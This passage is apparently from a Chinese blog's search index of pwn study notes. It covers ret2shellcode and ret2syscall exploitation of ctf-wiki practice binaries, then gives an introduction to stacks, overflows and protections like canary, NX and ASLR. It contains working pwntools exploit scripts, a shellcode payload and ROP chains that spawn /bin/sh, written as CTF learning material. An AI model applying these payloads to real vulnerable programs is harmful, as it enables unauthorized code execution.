ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>ret2syscall，即控制程序执行系统调用，可直接突破NX保护，获取 shell。</p><h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><p>文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p><strong>检测保护</strong><br><img src="https://pic.imgdb.cn/item/63ede4faf144a0100701c905.png"></p><p><strong>ida查看源码</strong><br><img src="https://pic.imgdb.cn/item/63ede589f144a01007028cbb.png"><br>依然是gets函数溢出</p><p>利用cyclic方法查到偏移量还是112</p><p><strong>接着利用系统调用来获取shell</strong><br><img src="https://pic.imgdb.cn/item/63ede698f144a01007043373.png"></p><p><strong>查找”pop eax; ret”</strong><br>命令：ROPgadget –binary ret2syscall –only “pop|ret” | grep “eax”<br><img src="https://pic.imgdb.cn/item/63ede7bdf144a0100706266d.png"></p><p><strong>查找”pop ebx, pop ecx, pop edx; ret”</strong><br>命令：ROPgadget –binary ret2syscall –only “pop|ret” | grep “ebx” | grep “ecx” | grep “edx”<br><img src="https://pic.imgdb.cn/item/63ede8bbf144a010070779dc.png"></p><p><strong>查找”&#x2F;bin&#x2F;sh”</strong><br>命令：ROPgadget –binary ret2syscall –string “&#x2F;bin&#x2F;sh”<br><img src="https://pic.imgdb.cn/item/63ede95cf144a0100708449b.png"></p><p><strong>查找”int 0x80”</strong><br>命令：ROPgadget –binary ret2syscall –only “int” | grep “0x80”<br><img src="https://pic.imgdb.cn/item/63edea55f144a010070a35cc.png"></p><p><strong>找到所有条件之后，构造exp</strong></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch = <span class="hljs-string">&quot;i386&quot;</span>, os = <span class="hljs-string">&quot;linux&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span> = <span class="hljs-title">process</span><span class="hljs-params">(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">offset</span> = 112</span><br><span class="hljs-function"><span class="hljs-title">pop_eax</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080bb196)</span></span><br><span class="hljs-function"><span class="hljs-title">pop_edx_ecx_ebx</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x0806eb90)</span></span><br><span class="hljs-function"><span class="hljs-title">bin_sh</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x080be408)</span></span><br><span class="hljs-function"><span class="hljs-title">int_0x80</span> = <span class="hljs-title">p32</span><span class="hljs-params">(<span class="hljs-number">0</span>x08049421)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">flat</span><span class="hljs-params">([b<span class="hljs-string">&quot;a&quot;</span> * offset, pop_eax, <span class="hljs-number">0</span>xb, pop_edx_ecx_ebx, p32(<span class="hljs-number">0</span>), p32(<span class="hljs-number">0</span>), bin_sh, int_0x80])</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"><span class="hljs-title">io</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p><p><a href="https://blog.csdn.net/qq_38025365/article/details/87968945">https://blog.csdn.net/qq_38025365/article/details/87968945</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn基础知识</title>
    <link href="/2023/02/07/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/02/07/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是pwn？"><a href="#什么是pwn？" class="headerlink" title="什么是pwn？"></a>什么是pwn？</h2><p>“pwn”是一个黑客语法的俚语，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。感觉就是向目标发送特定的数据，使其执行我们发送的恶意代码，以获取目标机器的最高使用权限。 </p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>概念：在计算机中，当要表示的数据超出计算机所使用的数据的表示范围时，则产生数据的溢出。</p><p>产生的原因：</p><ol><li>使用非类型安全(non-type-safe)的语言，如：C&#x2F;C++等。</li><li>以不可靠的方式存取或者复制内存缓冲区。</li><li>编译器设置的内存缓冲区太靠近关键数据结构。</li></ol><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>ESP(X86)&#x2F;RSP(X64)：用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。</p><p>EBP(X86)&#x2F;RBP(X64)：用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。</p><p>EIP(X86)&#x2F;RIP(X64)：用来存储即将要执行的程序指令的地址。</p><p>其他更多寄存器可参考：<a href="https://blog.csdn.net/ComputerInBook/article/details/122955217">https://blog.csdn.net/ComputerInBook/article/details/122955217</a></p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><p>32位X86架构下汇编指令有两种格式intel与AT&amp;T</p><p>intel：寄存器名称和数值前无符号。</p><p>AT&amp;T：寄存器名字前加“%”，数值前加“$”。</p><p>链接1：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x86-instructions">X86汇编指令</a></p><p>链接2：<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/x64-instructions">x64汇编指令</a></p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作。</p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的。</strong></p><p>函数调用栈的工作过程：<a href="https://www.bilibili.com/video/BV1Xt411x7Dr/?spm_id_from=trigger_reload&vd_source=75b0e2176ed6115febad096a2562ae52">32位程序动画演示</a></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别：</p><p>x86：函数参数在函数返回地址的上方</p><p>x64：</p><ol><li>System Ⅴ AMD64 ABI(Linux、FreeBSD、macOS等采用)中前六个整型或指针参数依次保存在RDI，RSI，RDX，RCX，R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于0x00007FFFFFFFFFFF，6个字节长度，否则会抛出异常。</li></ol><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧就是一个函数执行的环境：函数参数、函数的局部变量、函数执行完后返回到哪里等等。</p><p>每一个栈帧代表的就是一个未运行完的函数  。</p><p><img src="https://t.gmit.vip/2023/02/07/w92msl.png"></p><h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p><ol><li><p>程序必须向栈上写入数据。</p></li><li><p>写入的数据大小没有被良好地控制。</p></li><li></li></ol><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR（PIE）的话各个系统调用的地址就是随机化的。</p><ol><li><p>canary(栈保护)</p><p> 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p></li><li><p>NX（DEP）</p><p> NX即No-execute(不可执行)的意思，NX(DEP)的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行指令。</p></li><li><p>PIE（ASLR）<br> 一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。<br> 内存地址随机化机制(address space layout randomization)，有以下三种情况<br> <strong>0-表示关闭进程地址空间随机化。<br> 1-表示将mmp的基址，satck和vdso页面随机化。<br> 2-表示在1的基础上增加栈的随机化。</strong><br> 可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止进攻者在堆栈上运行恶意代码。</p></li><li><p>FORTIFY<br> 这个保护机制防止缓冲区溢出攻击。gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p></li><li><p>RELRO<br> 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a></p><p><a href="https://blog.csdn.net/ComputerInBook/article/details/122955217">https://blog.csdn.net/ComputerInBook/article/details/122955217</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
